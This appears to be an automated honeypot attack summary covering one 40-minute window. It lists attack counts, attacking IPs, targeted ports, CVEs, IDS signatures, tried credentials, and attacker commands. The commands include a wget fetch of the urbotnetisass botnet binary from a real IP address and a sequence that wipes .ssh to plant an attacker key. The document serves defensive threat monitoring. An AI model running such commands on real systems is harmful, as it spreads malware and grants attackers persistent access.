Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-12T15:01:21Z
**Timeframe:** 2025-10-12T14:20:01Z to 2025-10-12T15:00:01Z
**Files Used:**
- agg_log_20251012T142001Z.json
- agg_log_20251012T144001Z.json
- agg_log_20251012T150001Z.json

**Executive Summary**

This report summarizes 15,671 attacks recorded across the honeypot network. The most targeted services were SMB (TCP/445) and SIP (5060). A significant portion of the attacks were SSH bruteforce attempts and scans for vulnerabilities. The most active honeypots were Cowrie (SSH) and Suricata (IDS). The top attacking IP address was 77.37.142.33. Several CVEs were targeted, and a variety of malicious commands were attempted.

**Detailed Analysis**

***Attacks by honeypot:***
- Cowrie: 5068
- Suricata: 4103
- Honeytrap: 2147
- Sentrypeer: 2071
- Ciscoasa: 1874
- Dionaea: 111
- Mailoney: 110
- Redishoneypot: 52
- H0neytr4p: 41
- Tanner: 36
- ElasticPot: 23
- Adbhoney: 16
- ConPot: 4
- Ipphoney: 4
- Dicompot: 3
- ssh-rsa: 2
- Honeyaml: 6

***Top attacking IPs:***
- 77.37.142.33
- 103.90.97.165
- 107.173.61.177
- 45.128.199.212
- 198.12.68.114
- 196.251.84.181
- 172.86.95.98
- 62.141.43.183
- 102.88.137.145
- 108.85.73.157

***Top targeted ports/protocols:***
- TCP/445
- 5060
- 22
- 5903
- 8333
- 25
- 5909
- 5908
- 5901
- TCP/80

***Most common CVEs:***
- CVE-2002-0013 CVE-2002-0012
- CVE-2021-3449 CVE-2021-3449
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
- CVE-2019-11500 CVE-2019-11500
- CVE-2005-4050
- CVE-2022-27255 CVE-2022-27255
- CVE-2001-0414

***Commands attempted by attackers:***
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
- cat /proc/cpuinfo | grep name | wc -l
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- uname -a
- whoami
- cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...

***Signatures triggered:***
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET SCAN Sipsak SIP scan
- ET INFO Reserved Internal IP Traffic
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET DROP Spamhaus DROP Listed Traffic Inbound group 29
- ET CINS Active Threat Intelligence Poor Reputation IP group 2
- ET CINS Active Threat Intelligence Poor Reputation IP group 68

***Users / login attempts:***
- root/
- admin/admin123456789
- 345gs5662d34/345gs5662d34
- support/password123
- User/1
- openvpn/openvpn
- nobody/abc123

***Files uploaded/downloaded:***
- wget.sh;
- json
- w.sh;
- c.sh;
- arm.urbotnetisass;
- arm.urbotnetisass
- arm5.urbotnetisass;
- arm5.urbotnetisass
- arm6.urbotnetisass;
- arm6.urbotnetisass
- arm7.urbotnetisass;
- arm7.urbotnetisass
- x86_32.urbotnetisass;
- x86_32.urbotnetisass
- mips.urbotnetisass;
- mips.urbotnetisass
- mipsel.urbotnetisass;
- mipsel.urbotnetisass

***HTTP User-Agents:***
- None observed

***SSH clients and servers:***
- None observed

***Top attacker AS organizations:***
- None observed

**Key Observations and Anomalies**

- A significant number of commands are related to establishing a persistent SSH connection by adding a public key to `authorized_keys`.
- The `urbotnetisass` malware was downloaded, indicating attempts to infect IoT devices.
- The DoublePulsar backdoor was detected multiple times, suggesting targeted attacks against SMB vulnerabilities.
- A mix of generic scanning activity and more targeted attacks was observed.
- The most frequent commands are related to system information gathering, likely for fingerprinting the environment.
